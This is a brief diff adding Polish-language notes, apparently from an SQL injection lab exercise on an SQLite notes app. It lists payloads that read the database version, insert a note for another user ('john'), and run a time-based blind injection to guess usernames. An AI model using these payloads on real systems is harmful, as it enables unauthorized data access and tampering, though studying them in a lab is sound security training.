@@ -1,0 +1,11 @@
+1. Wersja sql lite:
+' || (select sqlite_version()) || '
+
+2. Dodanie notatki innemu użytkownikowi:
+note'), ('john', 'new john note
+
+3. Blind injection
+"' || (case when (select exists(select username from user where username like 'b%')) then (HEX(RANDOMBLOB(1000000000/2))) else '0' end) || '"
+
+4. Poprawki do działania
+
